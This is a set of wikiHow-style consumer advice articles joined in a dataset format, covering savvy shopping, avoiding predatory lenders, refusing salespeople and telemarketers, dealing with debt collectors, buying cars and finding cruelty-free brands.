, Another way you can save money on an item is to look for a used or refurbished version of the item. You can look for used items online or at stores that sell used items. Many common household items and clothing can be found at thrift stores for half the price as they would be new.You should always inspect the item before you buy it at a thrift store. Make sure there is no damage to the item and that it appears in good condition. You may not be able to return it, as many thrift stores have a no return policy, so make sure it is clean and functional before you buy it.
Refurbished items are items that have been used by someone else and then cleaned, repaired, and inspected so they are in like-new condition. Often, electronics are refurbished and sold by retailers online or in store. Always check the item and read any fine print in the sale price so you know exactly what you are buying.

, Coupons can be a good way to save money on everyday items and be a savvy consumer on even the smallest purchases. You can find coupons in newspapers, fliers, and online. Getting into the habit of looking at coupons on a daily or weekly basis will ensure you do not miss any good deals on items you may need around the house.You should always check the coupons for any restrictions or limitations, such as how many coupons you can use at one time or how many items you can purchase with one coupon. You can ask the retailer if they will accept expired coupons, as some retailers do this, before you throw it away.
You may focus on coupons for specific items, such as groceries, household products, or beauty products. You can then organize your coupons so you can find each one easily and get in the habit of using coupons on a daily basis.

, Most vendors will have sales during popular shopping times of the year, such as Christmas time or Black Friday. You should check for any sales or deals during this time, as many full price items may be marked down to encourage shoppers to buy.


You can look for information on upcoming sales or current sales by checking the newspaper, looking at free advertising fliers from businesses, and by keeping an eye on television ads for promotions or sales. You can also look online for information about sales at a certain retailer or store.
Keep in mind you should only buy items that you need and can afford, even if the price tag is marked down. Try to shop during peak times with a discerning eye, making sure you stay within your budget when you buy.

Contact the media.",How to Avoid Predatory Lending Practices," Legitimate lenders should fully disclose the true costs of a loan. They should also explain any risks inherent in the loan.For example, you should receive a Loan Estimate after you apply for a loan. This three-page form includes information about your monthly payment, estimated interest rate, and total closing costs. It also includes information about penalties and whether your interest rate will change.The Loan Estimate should be written clearly and be easy to understand. Avoid any lender who doesn’t give you this form.;
, However, the borrower rarely benefits from all of the refinancing—which instead generates fees for the lender.Be wary if someone approaches you about refinancing a loan you have just refinanced.

, Predatory lenders might structure the loan in such a way that it’s nearly impossible for you to pay it off.For example, they may only charge interest payments, which means you’ll never pay down the principal.


Always check the amortization schedule to see that you can pay the loan off during the expected time period.
Be on alert if a lender refuses to provide you with an amortization schedule or is otherwise resistant to discuss how the loan has been structured.

, Balloon payments are often used to hide the true cost of financing.Your initial monthly payments will be small, but you eventually need to make one giant payment at the end. Typically, you need to refinance in order to make the balloon payment.


You also need to see an amortization schedule so that you can see how much the balloon payment will be. Don’t be satisfied if the lender only tells you what your initial monthly payments will be.

, Predatory lenders often target the elderly, who are especially vulnerable because they may be isolated or no longer mentally sharp.If you are a senior citizen, you should be skeptical of any lender who approaches you with a loan offer.


Predatory lenders also target people who have less education or are unsophisticated, such as first-time borrowers. If any of these factors apply to you, don't sign for a loan until you meet with someone else to discuss it.

, Predatory lenders often lend based on the equity you have in your home—and not on your ability to repay the loan.They do this because they are most interested in getting you to default and then foreclosing on your home.


Pay attention to whether the lender asks to see your employment data and financial information, or whether they are only focused on how much equity you have in your home.

, Arbitration is a dispute resolution method that happens outside of court. Instead of presenting your case to a judge, you present it to an arbitrator, who might be a private attorney. Arbitration often benefits large corporations who appear before arbitrators frequently.


Avoid loans with mandatory arbitration clauses. Instead, you'll want the option of suing in court.

, Predatory lenders often use the same phrases to lull you into thinking you’re getting a great deal. Pay attention to the following promises:


“No upfront fees.” The key word is “upfront.” This doesn’t mean the lender won’t fold fees into the loan.
“No credit, bad credit, no problem.” If a lender doesn’t care about your credit history, why are they making a loan? Often, predatory lenders give home improvement loans with your house serving as collateral. If you can’t make payments, they foreclose on your home.
“You have nothing to lose.” Lenders don’t lend for free. Although a loan evaluation might be free, probably nothing else is.

, If you use a mortgage broker, make sure to properly vet them. Check with your state to see if they are properly licensed to do business.Contact your state’s Department of Corporations and/or the Department of Real Estate.

, Another technique predatory lenders use is to offer you loans that are more expensive than you would otherwise qualify for.It can be hard to tell whether a loan is too expensive. However, you can certainly compare offers from different lenders and eliminate any that are out of line with the rest.


Avoid just waiting for lenders to come to you. In fact, predatory lenders are often quite aggressive in selling their products. They may advertise on television and through direct mail. They might even call you or visit you at home., Predatory lenders often encourage potential borrowers to lie about their income or their assets. If they do, then avoid doing business with them.They are trying to sell you a loan you don’t qualify for.


Also check your application to make sure the lender has properly reported your income, employment history, and assets.If you think the lender is inflating the value of the property, seek an independent appraisal.

, Some predatory lenders might encourage you to take out a larger loan than you need. Again, the purpose of this technique is to get you to default on your loan and lose your home in a foreclosure.


Never take out a loan that is worth more than the value of your home.

, Predatory lenders try to hide fees and charges in the loan packaging. Accordingly, you need to carefully review your loan offer. Walk away if you find unacceptable charges.


Look for fees or charges that haven’t been properly explained to you. Even if explained, question whether they are really necessary. For example, a lender might charge you for credit insurance when it isn’t necessary.Also look if there are prepayment penalties. If you can pay off a loan early, then you can lower the overall cost because you will save on interest payments. However, predatory lenders often charge penalties if you pay the loan off early. Avoid loans with pre-payment penalties.Check if the interest rate increases upon default. Avoid a loan with this term.
Review points and origination fees. You shouldn’t pay any points or fees that exceed 4% of the loan amount.

, You shouldn’t be rushed into signing a loan. Avoid any offer that is valid for only one or two days.This is a high-pressure sales technique associated with predatory lending.


Of course, by waiting, the cost of your loan might increase. However, a reputable lender should explain this to you and possibly offer you the option of locking in the interest rate for a certain amount of time.

, If you ever have questions, you can meet with a housing counselor for free by contacting the U.S. Department of Housing and Urban Development. Call toll free 1-800-569-4287 to find your nearest agency.Your counselor can review your financial situation and any loan offers you have received. They can identify anything that looks suspicious.

, Make sure the lender gives you a Closing Disclosure. Check that the loan details are what you have expected. If anything is different, you should avoid signing for the loan. Also avoid signing a loan if you receive no disclosure.You should receive the Closing Disclosure at least three days before your scheduled closing.Remember to keep copies of all documents lenders give you., Predatory lenders might give you documents with blank lines on them or with incorrect information. Avoid signing these documents.Also make sure all required information has been included in your documents. Don’t rely on verbal promises. Instead, get everything in writing.

, Report predatory lenders to your state’s consumer protection office. There should be a link at your state’s Attorney General’s website. Check their website or call their office., Often, you won’t discover you’ve fallen victim to predatory lenders until you fall behind on your mortgage. One day you realize that your mortgage payment has increased dramatically, or the lender is moving to foreclose on your home. You need to contact an attorney as soon as possible to discuss your options.


Find your nearest bar association and call for a referral.Then call up the lawyer and schedule a consultation.
Gather all helpful documents so the attorney can understand your case. Take a copy of your loan agreement, correspondence, and a payment schedule.

, If your lender has tried to foreclose on you, then you might be able to raise predatory lending as a defense.If you win, you get to save your home.


You might also be able to sue for cancellation of the contract (called “rescission”).
You can probably also sue for money compensation, called “damages.” Discuss with your lawyer what laws give you a right to sue for money and how much you might get.For example, you might be able to sue for fraud or for violations of certain federal laws.

, Predatory lenders often target vulnerable communities, such as people of color or those who don’t speak English. Because sunlight is the best disinfectant, you should contact your local newspaper or television station. They might run a story on the lender and expose them.

Tell them you’re just looking around.,
Try not to look uncertain.,
Use body language to convey your disinterest.,
Keep walking as you pass a shop or kiosk.,
Listen politely for a few minutes.",How to Refuse Annoying Salespeople1," Let them know they’re not getting a sale today because you won’t be spending any money. They’ll lose interest in you and avoid you if you let them know you’re just browsing. Politely let them know they’d be better off talking to a customer more interested in actually buying something.Try saying, ""Thanks, but I'm just browsing today,"" or ""I don't have any money on me - just looking!"";
, Don’t tell the salesperson that you’re not sure what you want to buy or show them that you’re indecisive about anything. They will interpret your uncertainty as an open invitation to sell you something or describe a product. Tell them you know what you’re looking for and would prefer to shop alone.Consider saying, ""I know what I'm looking for and where it is, thanks!"" Try out, ""I don't need help, thank you,"" or ""I know where to find what I need.""

, When you’re in a store, avoid making eye contact or smiling at salespeople who appear to be persistent or aggressive. Don’t engage them in small-talk or give them an opportunity to pivot from a nice conversation to sales pitch. You don’t need to yell or look really mean, but you can effectively convey that you’re not an approachable target.Try pretending you're talking on the phone, texting, or otherwise too occupied to engage in a conversation.

, If you’re walking through a mall or market with small shops or kiosks, don't slow down when salespeople try to get your attention. Keep up your pace, so they won’t be able to recite a pitch to you. Give a polite smile or head nod as you pass by, but make sure you keep walking so you don’t seem approachable to them.


Consider saying, ""Thanks, but I'm in a rush!"" as you pass.

, Alternatively, if you might be interested in what the salesperson is selling, give them a minute to make their pitch. Whether in the store, a kiosk, or elsewhere, listen to their description and deal if you’re in the market for their product or service.


Just make sure you’ll be able to be firm and say no if it turns out you’re really not all that interested. Don’t get pulled into a deal you didn’t really want or need.
As soon as you decide you're not into the pitch, interrupt them and try saying, ""Thanks but no thanks!"" or ""Okay, I've really got to get on my way, thanks for the info!""

Organize your purchases by category (food, clothing, entertainment, etc.). Categories with the highest monthly amounts (or monthly amounts you consider surprisingly high) may be good targets for saving money.
Once you've tracked your purchases for a while, create a monthly (or weekly) limit for each category. Make sure the total budget is smaller than your income for that period, with enough leftover for savings if possible.;
, Making spur of the moment decisions can balloon your expenditures. Write down what you need to buy while you're calm and at home.


Make a preliminary trip before you go on your real shopping trip. Note the prices of several alternatives at one or more stores. Return home without buying anything and decide which products to buy on your second, ""real"" expedition.The more focused you are and the less time you spend in the store, the less you'll spend.If you are motivated to treat each purchase as an important decision, you will make better decisions.Do not accept free samples or try something on just for fun. Even if you don't plan on purchasing it, the experience can convince you to make a decision now instead of considering it carefully in advance., If planning your purchases in advance is a good idea, buying something on the spur of the moment is a terrible one. Follow these tips to avoid making shopping decisions for the wrong reasons:


Don't browse store windows or shop for fun. If you're only buying something because you find the act of shopping fun, you'll likely end up spending too much on stuff you don't need.Don't make purchasing decisions when your judgment is impaired. Alcohol, other drugs, or sleep deprivationcan harm your ability to make sensible decisions. Even shopping while hungry or listening to loud musiccan be a bad idea if you don't stick to your shopping list.

, Children, friends who love shopping, or even just a friend whose tastes you respect can influence you to spend extra money.Do not take advice from store employees. If you need a question answered, politely listen to their response but ignore any advice on purchasing decisions. If they won't leave you alone, leave the store and return later to make your decision.

, Credit and debit cards increase spending for two reasons: you have much more money available to spend than you normally would, and because no visible money is changing hands, it doesn't register as a ""real"" purchase. Similarly, running up a bar tab or using a delayed payment scheme makes it harder to realize how much you're actually spending.Don't bring more cash with you than you need. If you don't have the extra money, you can't spend it.Similarly, withdraw your weekly budget from an ATM once a week rather than filling up your wallet whenever you run out.

, Outside influences are a huge factor affecting what we spend our money on. Be vigilant and try to be aware of all the reasons you're drawn to a product.


Don't buy something on the basis of an advertisement. Whether on television or the product's packaging, treat ads with skepticism. They are designed to encourage you to spend money and will not provide an accurate portrayal of your options.
Don't purchase something just because it's reduced price.Coupons and sales are great for products you were already planning to buy; purchasing something you don't need just because it's 50% off does not save money!
Be aware of pricing tricks. Translate that ""$1.99"" price into ""$2"". Judge the price of an item on its own merits, not because it's a ""better deal"" than another option by the same company. (By making the ""worse deal"" atrocious value, someone can trick you into paying more for add-ons you don't need).
Don't automatically buy the mid priced product within a category. Marketers know that if they want you to buy a high-priced product instead of a low-priced product, they can influence your decision by adding an outrageously expensive product to make the high-priced product intermediate in price and look reasonable in comparison.

, If you know you'll need a particular item but don't need it today, wait until it ends up in the bargain bin or try to find a coupon for it.



Only use a coupon or take advantage of a discount for an item you absolutely need or decided to buy before the discount occurred. The attraction of a cheaper price is an easy way to get customers to buy something they don't need.
Buy products only useful at particular times of year during the offseason. A winter coat should be cheap during summer weather.

, Before making expensive purchases, go online or read consumer reports to find out how to get the most bang for the least buck. Find the product within your budget that will last longest and meet your needs best.

, You'll end up paying a lot more than the sticker price for many big-ticket items. Read all the fine print and add up the total amount before making your decision.


Don't be fooled by lower monthly payments. Calculate the total amount you'll spend (monthly payments x number of months until fully paid) to find out what the cheapest option is.
If you're taking out a loan, calculate how much total interest you'll have to pay.

, This may sound paradoxical (isn't this buying something you don't need?) but in fact, it's easier to maintain your spending goals if you give yourself the occasional reward. Try to go cold turkey on unnecessary spending and you may eventually ""crack"" and splurge much more than you should.Set aside a very limited amount of money in your budget for these treats. The goal is to give yourself a small reward to keep your spirits up and prevent a giant splurge later.
If your usual methods of treating yourself are expensive, find cheaper alternatives. Take a bubble bath at home instead of going to the spa, or borrow a movie from the library instead of going to the theater.

, Go through your closet and see what you already have. Sell or give away anything you don’t wear or that doesn’t fit so you have a better idea of your situation.


Clearing out your closet is not an excuse to buy replacements. The goal is to find out what types of clothing you have enough of, and which you actually need more of.

, It's foolish to buy the priciest brand of socks, since socks wear out quickly. However, spending more money on a pair of higher quality, longer lasting shoes may save you money in the long run.


Remember that price doesn't guarantee quality. Research what the longest lasting brands are rather than assume the most expensive option is best.
Similarly, wait until the item you need goes on sale when possible. Remember not to use sales an excuse to purchase items you don't require.

, Some secondhand clothing shops carry surprisingly high-quality items. At the very least, you should be able to purchase basic items for a fraction of brand new prices.


Thrift stores in more affluent neighborhoods usually receive higher-quality donations.

, A designer logo does not indicate a higher quality.

, Once you have an amount budgeted for food, write down in advance the exact meals you will eat and what you need to purchase at the grocery store to make them.


This will not only prevent you from making impulse buys at the grocery store, but also prevent wasting money due to food waste, a major expenditure for many people.If you find yourself throwing away food, reduce the size of your planned meals.

, There are many ways to save money while grocery shopping, from buying food in bulk to knowing the times of day when various products are cheaper.

, Eating out is much more expensive than preparing your own food, and should never be done as an impulse by someone who is trying to save money.


Pack a lunch at home instead and bring it with you to work or class.
Fill a water bottle using your tap at home instead of buying expensive bottled water.
Similarly, if you drink coffee frequently, buy a cheap French press and save money by preparing it at home.

, Making wise spending decisions goes hand in hand with saving. Budget as much as you can each month toward a savings account or other reliable, interest-accumulating investment. The more money you save each month, the better your overall financial health will be. Which is pretty much the point of spending money wisely, isn't it? Here are some savings ideas for you to consider:


Establish an emergency fund.

Start a Roth IRA or a 401(k).

Avoid unnecessary fees.
Meal plan your meals for the week

, Compulsive habits such as smoking, drinking, or gambling can easily consume any money you save. Eliminating them from your life is both a boon to your wallet and your health.

, If you're unsure about a particular purchase, ask yourself these questions. If you don't answer ""yes"" to all of them, that's a strong sign you shouldn't spend the money.


Will I use this item regularly? Make sure you'll drink all that milk before it goes bad, or that you have enough summer months left to wear that skirt more than a couple times.
Do I lack something that serves the same purpose? Beware specialized products whose role can be performed by basic items you already have.You probably don't need ultra-specialized kitchen equipment, or a special workout outfit when sweatpants and a T-shirt will work just as well.Will this item change my life for the better? This is a tricky question, but purchases that encourage ""bad habits"" or cause you to neglect important parts of your life should be avoided.
Will I miss this item if I don't buy it?
Will this item make me happy?

, If you have a gym membership and don’t use it, don’t renew it. Avid collector turned to lukewarm possessor? Sell it. Devote your finances and your energy only into areas you are truly passionate about.

Pay with a bank check or money order.",How to Deal With Collection Agencies," Collections agencies will either contact you through the mail or over the phone. Either way, you should not pay any money right away. The collection agency is legally required to take several steps to prove that you owe them money before you're obligated to pay. There are even scams where con artists pose as debt collectors and intimidate you into sending them money. So don't pay anything before going through more steps to verify that you legitimately owe the agency money., It is important to keep track of all your contacts with the agency. If the situation eventually ends up in court, you'll have plenty of records to help your case.If you receive a phone call, ask for the name of the collection agency, the name of the person speaking to you, and the amount they say you owe. Write all of this down with the date you were contacted and a summary of the conversation. Do this every time you speak to the agency on the phone.
Make copies of any letters the agency sends you in the mail and keep them all together in a folder. Also keep copies of letters you send to the agency and send everything via certified mail and request to be notified when it is successfully delivered.
Save any voice mails or phone messages the agency leaves you.
According to federal law, collectors must disclose their identity to you.If the person who's contacted you refuses to reveal the information you've requested, you may be dealing with a con artist. Inform them that they are legally required to identify themselves and if they still refuse, hang up.

, Within five days of first contacting you, the collection agency is legally required to send you a verification of the debt you owe. This letter should include the amount of money you owe and the name of the original creditor.If the agency contacts you over the phone, refuse to talk further until you've received verification of your debt. All you should say is that you want written proof of your debt, and then you should stop talking.
If the agency initially contacts you with a letter, write back and demand more information. Remember to send all of your correspondence via certified mail — this will ensure that the agency can't claim that they didn't receive your letters.

, Talking with a collection agency on the phone can be very nerve-racking. If you'll have trouble remembering all of this information, write down what you'll say and keep it in front of you while you talk to the collector. There isn't much reason to deviate from this script — you won't be disclosing and personal information and all you should really do when speaking to the collector directly is request documents in writing. The less you say the better.Your script might be something like: ""I'm not going to talk with you until I receive a Debt Verification Letter proving you are legally allowed to contact me about this debt.""They may ask for your work address to send the letter — do not give them that information. The letter should be sent to your home address or P.O. Box if you have one.
Remember the collector is trained in getting you to respond emotionally. If you respond with emotion, they can get you to do things you wouldn't normally do. The more information you give them, the more they have to use against you. If you mention that you are a Christian, they will quote scripture, if you mention you had an illness, they will use it to make you feel guilty.

, End the phone call after you request written confirmation of your debt. The collector may make threats like he will freeze your assets if you don't pay, but he has no power to do this. In fact, a collector making such a threat has violated federal law. If the collector fails to send you this statement in writing then the claim is no longer valid.They may also claim that if you don't pay you may go to jail, but owing a debt is not punishable by jail time.

, It would be beneficial for you to learn the laws that collection agencies must abide by while you wait for the agency's statement in the mail, . All collection agencies are regulated by the Fair Debt Collection Practices Act (FDCPA). This act bans several practices for collectors. Read this law carefully in preparation for your dealings with the collection agency. By learning the laws, you can counter threats or intimidation by saying that you know the law and the collector's actions are illegal. Among the banned practices are:


Calling you before 8AM or after 9PM (your local time), unless you've agreed otherwise.
Using any obscene or abusive language.
Contacting you at work if you've requested them to stop.
Accusing you of committing a crime.
Threatening to take your property without first going through the court system.
Remember that even if the agency purchased the debt from the original creditor, it is still considered a collector and not a creditor. It is therefore still bound by the rules of the FDCPA, even if collectors try to tell you otherwise., According to the FDCPA, this statement must include the following to be considered valid.The amount of the money owed.
The name of the original creditor.
A statement that if you don't dispute the debt within thirty days, the debt is assumed valid.
A statement that if you dispute the debt within thirty days, the agency will obtain proof of the debt and send it to you.
A statement that upon request, the agency will provide the name and address of the original creditor, if it differs from the current creditor.

, It is very important to make sure you actually owe the money the collector says you do. Though it is illegal, creditors could inflate the amount of money you owe to make a greater profit. You legally have thirty days to dispute the charge and ask for validation of the debt. Once you do so, the collector must cease pursuing you for the money until he produces proof of the original debt.The agency must provide one of the following.Proof that they either own or have been assigned the debt from the original creditor.
A copy of a statement from the original creditor.

, When the agency provides proof that you owe the money, you still have options. Each state has different laws on how long a debt is considered effective.These are mostly, but not universally, less than ten years. When a collection agency comes after you for outdated debt, it is known as zombie debt (Deal with Zombie Debt).


Check the date of the proof the agency provided. Then match it against the statute of limitations for debt in your state.
If the date of the original debt is older than the statute of limitations, you can no longer be sued for the debt. They can call you, they can contact you, but they can't sue you or threaten you., If the agency has not provided adequate proof of your debt, their claim is not legitimate. Send a certified letter informing them that their actions are in violation of the FDCPA and you will pursue legal action if they keep trying to collect from you., While it is easy to get flustered talking to a debt collector, you should always remain calm. Getting angry and yelling at the collector won't help your situation.State your willingness to work with the collector. Say you fully intend to pay your debt as soon as the agency provides adequate proof.

, Collectors may tell you that they require this information, but this isn't true. They don't need to know your banking information, place of employment, or any information besides your phone number and address. You can ask them to read your phone number and address to you, and you will confirm if it is accurate.


Make sure your information is not available on social media. If a debt collector finds your Facebook page and all your information is public, he may be able to find out your place of employment as well as a ton of other personal information he may try to use against you. Make sure all your social media accounts are accessible to friends only and that you don't approve any friend requests from people you don't know.

, Become familiar with the FDCPA to spot where the collector is lying to you or trying to intimidate you. Collectors prey upon people who are unfamiliar with the law. For example, the collector may threaten to garnish your wages — that is, take a certain amount of your paycheck until the debt is paid off — if you don't pay. While this is possible, he must sue you in court first, win the lawsuit, get a judgement, and execute the judgement before garnishment is possible.If the collector begins getting belligerent or using offensive or threatening language, inform him he is in violation of federal law and you are no longer willing to speak to him. Again, take detailed notes on everything he says and make sure you get his name and the date and time of the conversation.
If the calls become harassing or inappropriate you should make detailed notes on the time of the call, length of the call, and exact conversation or record the call with permission.

, Since this situation could end up in court, having a complete record will be helpful.


Some states allow you to record phone calls without the other person's knowledge. Check your local laws and see what you are legally allowed to do.
If you are legally required to get the other person's consent to record the call, simply inform them that you will be recording the conversation for your records.

, Before paying anything, have the collector send you a statement saying that the amount you are paying will cancel your debt.

, Even when the agency has confirmed that you owe money, you may still be able to get away with paying less than you owe. Chasing you down for money is a long and expensive process, and an agency may be willing to accept a smaller payout if it is immediate.Begin by asking if the collector is willing to negotiate a deal. Be sure to say that you plan on paying immediately if you two reach a deal.
If the collector is willing to negotiate, start by offering a small amount, like 20% of the debt. The collector will then offer a counter-amount. Keep working back and forth until the two of you reach an agreement. At this point, you must get the agreement in writing. An email or fax is generally acceptable as long as it has the amount agreed upon, the date by which you need to pay (immediately in this case), and that once paid your debt will be considered paid in full. This prevents them from taking the amount then saying it was a partial payment and chasing you for the rest.

, If you cannot provide the full amount of the debt immediately, come to an agreement on how much you will send every month until the debt is repaid.


Make sure this amount is something you absolutely will be able to pay. Missing more payments will hurt you further.
Emphasize that you are willing to pay, but this amount is all you can afford right now. Offer to speak on the matter again in a few months to see if the monthly amount can be increased.
As always, get this agreement in writing.

, Do not send the agency a personal check. This provides them with your banking information. Under no circumstances should you allow a collection agency access to your bank account. This is not necessary to pay back your debt.If you must provide electronic transfer information, set up a new account in a separate bank and place only the amount you agreed to transfer in that account. This prevents the collector from taking out more than they've agreed.

Discuss the issue with the store manager.,
File a complaint with your credit card company.,
Contact the Better Business Bureau.,
File a complaint with the Federal Trade Commission.,
Take your case to small claims court.",How to Be a Savvy Consumer5," If you end up finding an issue or defect with an item, you have the right as a consumer to address it with the retailer. Perhaps you open the box and realize an item is damaged when you get home or you buy an item that turns out to be faulty or broken. You should contact the retailer immediately or as soon as possible in person or on the phone and discuss the issue. If a salesperson is not willing to help you or is not able to give you a refund, you may have to escalate the issue to the store manager.


You should remain calm when you speak to the store manager and explain the issue with the product. You may need to provide your payment information and proof of payment, such as a copy of your receipt.
Most retailers should offer you a refund if an item is damaged or faulty. If the retailer has a no refund policy, it should be stated up front so you are aware of the policy as a consumer.
If you speak to a retailer over the phone, document the details of your contact, including the date, time, who you talked to, what was said, and the outcome. This information may be useful if further action is needed.

, If you have been falsely charged for a transaction and the merchant refuses to reverse the transaction, your credit card issuer might be able to help. Contact their customer support line and request help with the transaction. Your goal will likely be to obtain a ""chargeback,"" which reverses the sale. Most credit card issuers will fight for your rights and work to get you your money back., If a retailer or business is not responding to your needs as a consumer or appears to be providing sub par services or products, you may be able to file a complaint with the Better Business Bureau (BBB). You can file a complaint online through the BBB website or contact the BBB by phone.Keep in mind the BBB does not handle complaints related to discrimination or disputes between an employee and an employer. The BBB also cannot challenge any local, state, or federal laws as part of your complaint or issue.

, The Federal Trade Commission (FTC) can address any issues related to identity theft, a business that is operating as a scam or rip off, as well as complaints about fraud or abuse from a business. You can file a complaint with the FTC online or by phone.Keep in mind the FTC cannot resolve consumer complaints for you, but they can provide tips on how to get your money back from a shady retailer. Your complaint to the FTC can also allow them to flag the business so it is on their radar as a scam or fraudulent business.

, If no agreement can be reached from the previous steps, your only option is to take the dispute to small claims court. This type of court proceeding is often used to settle disputes between businesses and customers. Luckily, you can usually argue the case yourself, rather than hire a lawyer. Just make sure that you provide the judge with evidence in your favor, such as a record of the purchase and evidence of damaged or incomplete merchandise. The judge will issue a decisions either on the spot or within a few days."

Just say ""no"" or “no thanks.” If someone knocks on your door to sell you something and you don’t want to hear it, just refuse to participate.,
Post no knocking or no solicitors signage.,
Excuse yourself or make something up.,
Don't open the door if you're suspicious.",How to Refuse Annoying Salespeople2," Be firm about it. Say, “Thanks, but no thanks. Have a great day.” Remember there is nothing wrong with saying no, and you should work on being able to say it if you have trouble.Whether in a store, at your door, or over the phone, salespeople can and will take advantage if you feel bad for them. Don’t worry about hurting their feelings by saying no.

, Get stickers or signs that will let door-to-door salespeople you don’t answer uninvited knocks or solicitors. Check with your local government or neighborhood association to see if they have any official or uniform signs that you should post. In many areas, soliciting despite there being a clearly posted sign is a local code violation., If you’re nervous about saying no to someone, just relax and politely excuse yourself. Try saying, ""I'm very happy with the brand I use now,"" ""Oh, I have one of those already,” or ""No I just don't need one of those right now.""


Kids make a great excuse for just about anything - tell the salesperson you really have to get back to looking after the kids.
Say you’re cooking a meal, in the middle of a chore, on the phone, or something else that requires your immediate attention if you don’t want to just say no.

, If you don't want to be bothered, have posted no-knock signs, or are suspicious of door-to-door scams, don't open the door at all. In addition, if you're a senior, a teenager at home alone or babysitting youngsters, or in any similarly vulnerable position, avoid opening the door unless you are expecting someone you know and trust. Consider calling the police if you are aware of door-to-door scams happening in the area or if the person knocking won't leave.

Realize that there’s more to purchasing a car than price.,
Don’t let these automobile geniuses intimidate you.,
Proceed into the service lot and look at the license plate frames.,
Choose your salespeople; don’t let them choose you.,
Educate yourself.,
Don’t let salespeople woo you into trusting them with their “impressive"" knowledge of cars.,
Know the competition.,
Be firm.,
Once you show serious intention of buying, the salesperson will offer you a test drive, during which he or she will talk glowingly about the car to get you to take mental ownership of it.,
Avoid answering personal questions.,
Read the sticker carefully.,
Take particular note of a common padding tactic: A prep fee of $100 or more.,
Don’t let yourself get “turned over."",
When the deed is done, inspect your new car thoroughly before you leave the dealership.",How to Outwit Ruthless Car Dealers," Where you buy counts too. Take the time to evaluate the different dealerships. Visit a few and walk around. When a salesperson approaches you, say, “I’m just looking around, and I’ll come to you when I’m ready."";
, Walk around the service area and sit down. Stay for 30 minutes. Observe A) Is it orderly and run efficiently? B) Is the manager on the premises and working? C) Are the customers treated with respect?

, In a reputable dealership you will see frames from competing dealerships too. Don’t choose a dealership that’s out of the way. The salespeople know that they have just one chance to make a sale, and they lean hard on you. Avoid multi-franchise dealerships. Too many people run different parts of the operation, causing confusion in service.

, Speak with several. Ask: A) How long have you worked at this dealership? (The longer the better) B) Where else have you worked? And for how long? C) May I get the name and number of a recent customer? (Follow up with a phone call). If there are a lot of turnovers, leave, there is a strong probability the dealership is unstable. Trap: Looking for a salesperson who’s a member of your ethnic group, because you think you will get special treatment. You won’t, and you will be letting your guard down.

, Get as much information as possible about a car before you sit down with the salesperson. Collect brochures (dealers don’t usually keep them on display, because they want you to approach the salespeople) and read consumer magazines that rate autos.

, That’s how they try to establish authority and take control of the sale.

, If you say that you are considering a competing brand, the salesperson will knock it, and be very convincing if you’re uninformed.

, If you are not firm about what you want, you could easily end up with what the salesperson wants to sell you, the most expensive model with the most extravagant option at the highest price.

, Don't turn on the radio, so that you can hear the noise of the motor. Hopefully it will sound as though it is working properly. He is seducing you. Resist. Trap: Negotiating to buy when you’re tired of shopping. Salespeople are attracted to this kind of customer like bees to honey. They know that if they promise you what you’ve been looking for, whether they have it or not, you will probably buy on the spot. Buy only when you’re in an energetic mood.

, Few salespeople ask idle questions. Seemingly relevant questions are actual attempts to find out about your lifestyle, income, driving habits, etc. Avoid answering these questions.

, D.A.P. stands for Dealer Added Profit. Locator Cost means the dealer procured the car. All these charges are negotiable.

, For those unfamiliar with auto buying, the cost of preparing your car for delivery is included in the manufacturer’s sticker price.

, If a salesperson feels that he’s not in control of the sale, he’ll say that he’s going on a coffee break and will “turn you over"" to another salesperson. In a high-pressure operation, this could happen three or four times, until they wear you down. How to resist: Go for a walk, have a cup of coffee at a nearby diner, say that you need to think about it. Get away from the salesperson so you can think clearly.

, Make sure everything is working correctly. If you follow these suggestions, buying a car can be a joyful adventure, instead of a crazy mishap.

Use PETA’s cruelty-free search engine.,
Check product labeling.,
Be careful with unverified labels.,
Write or call companies.,
Find out if the products are sold in China.,
Download cruelty-free apps for your smartphone.",How to Avoid Buying and Using Animal Testing Brands1," PETA, or the People for the Ethical Treatment of Animals, has always advocated for companies and consumers going cruelty-free. To help their supporters find cruelty-free products and companies, they have created an online search engine on their website that helps users find these products and companies based on various search criteria. You can search for companies in your area, or focus on a specific type of product you’re looking for. You can also use the search engine to narrow the results down to only products that are available in your country.There are other organizations that have similar search engines. For example, the Cruelty Free International website offers a search engine for products that sport the Leaping Bunny logo, which denotes the product is cruelty-free.;
, The Leaping Bunny organization supports companies that do not test on animals. To find these products on any given shopping trip, check the product label for the Leaping Bunny logo—a simple black outline of a leaping bunny. You will most likely find this logo on the information label, somewhere near the barcode, if the product has one.The Humane Society of the United States offers a free downloadable infographic that will help you understand product labeling, and help you find cruelty-free products., The Leaping Bunny is the only logo that signifies that no ingredients of a certain product, nor the finished product, have been tested on animals. While some products may say “cruelty-free” or “not tested on animals,” it’s still possible that certain ingredients in the product may have been tested on animals, even if the finished product was not. If the product doesn’t have the Leaping Bunny logo on it, do a search through their database to look the product up specifically., If you don’t see a Leaping Bunny logo but can’t identify whether or not the product has been tested on animals, you can simply contact the company and ask. Most companies will have readily available contact information either on the product label itself or on their website. Try the number on the packaging or look the company up online for how to contact them., China requires that all imported makeup and beauty products that will be sold in the country be tested on animals. In 2016, the Chinese government also began planning for more products to be added to this regulation, including things like toothpaste and even soap. Do a quick internet search or contact the company to find out if their products are tested on animals before or after being exported to China.Products made in China but not sold there are not required to be tested on animals. China requires animal testing only on products that will be sold in China. Check the product’s label to see if it was made in China. If it was made in China, look on their website or do an internet search to find out if that product is available in China. If the product is only made there, but not sold there, the product is not required to be tested on animals., The Leaping Bunny has its own app that you can download to locate and learn more about cruelty-free products. PETA also compiled a list of vegan-friendly apps that can help you find vegan and cruelty-free products around you. This is a convenient way to find cruelty-free products nearby the next time you go shopping.For example, the app Bunny Free allows you to quickly look up a company name and find out whether or not they test on animals. This could be very helpful if you are shopping and need to get some information on the go.

Don’t just hang up right away.,
Add yourself to the national do not call registry.,
Ask where they got your contact info.,
Tell them “No calls, emails only.” If you’re running a business, in charge of purchasing, or otherwise need to field sales pitches from time to time, tell telemarketers that you only respond to emails.",How to Refuse Annoying Salespeople3," If you hang up on a telemarketer right away, you’ll probably be placed on the “no answer” list, and will be called again eventually. You don’t want to engage a telemarketer in conversation either, especially if you have absolutely no interest in their product or service.


The easiest way to handle a telemarketer is to say, “Please put me on your do not call list.”
If the telemarketer keeps interrupting you or a robot calls you, you might just have to hang up. If the same number persistently calls, report it to the FCC by calling 1-888-CALL-FCC or going to https://www.fcc.gov/.

, If you live in the United States, you can add yourself to the do not call registry. It'll then become illegal for telemarketers to contact you: https://www.donotcall.gov/. If you do get contacted by a telemarketer after putting yourself on the list, you can report the number that called you to the FTC or FCC.
